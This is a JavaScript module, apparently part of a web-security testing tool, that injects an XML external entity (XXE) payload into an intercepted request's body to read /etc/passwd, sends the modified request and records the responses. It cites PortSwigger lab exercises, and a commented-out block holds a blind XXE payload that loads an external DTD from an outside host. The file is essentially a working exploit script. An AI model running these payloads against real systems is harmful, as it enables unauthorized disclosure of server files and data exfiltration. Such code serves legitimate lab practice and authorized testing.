import { setup_response } from "../utils/methods.js";

export default async function post_xmlbody_attack(request) {
  const parser = new DOMParser();
  const xmldoc = parser.parseFromString(request.payload, "application/xml");
  let text = xmldoc.documentElement;

  while (text.firstChild) {
    text = text.firstChild;
  }
  text = text.textContent;

  let results = [];
  let listOfAttack = [];
  let lstOfAttacks = [
    // LINKS:WORKING - https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
    '><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
  ];

  for (let index = 0; index < lstOfAttacks.length; index++) {
    let bodyTxt = new XMLSerializer().serializeToString(xmldoc);
    let thebody = bodyTxt
      .replace(">", `${lstOfAttacks[index]}`)
      .replace(">" + text + "<", ">&xxe;<");

    listOfAttack.push(`await fetch('${request.url}', {
      method: '${request.method}',
      body: '${thebody}',
    }).then((x) => x.text())`);

    await fetch(`${request.url}`, {
      method: `${request.method}`,
      body: `${thebody}`,
    })
      .then((x) => x.text())
      .then((x) => results.push(x));
  }
  // // https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
  // thebody = bodyTxt.replace(
  //   ">",
  //   '><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://www.thor-demeestere.be/advancedxml.php"> %xxe;]>'
  // );

  // listOfAttack.push(`await fetch('${request.url}', {
  //   method: '${request.method}',
  //   body: '${thebody}',
  // }).then((x) => x.text())`);

  // await fetch(`${request.url}`, {
  //   method: `${request.method}`,
  //   body: `${thebody}`,
  // })
  //   .then((x) => x.text())
  //   .then((x) => results.push(x));

  setup_response(request, results, listOfAttack);
}
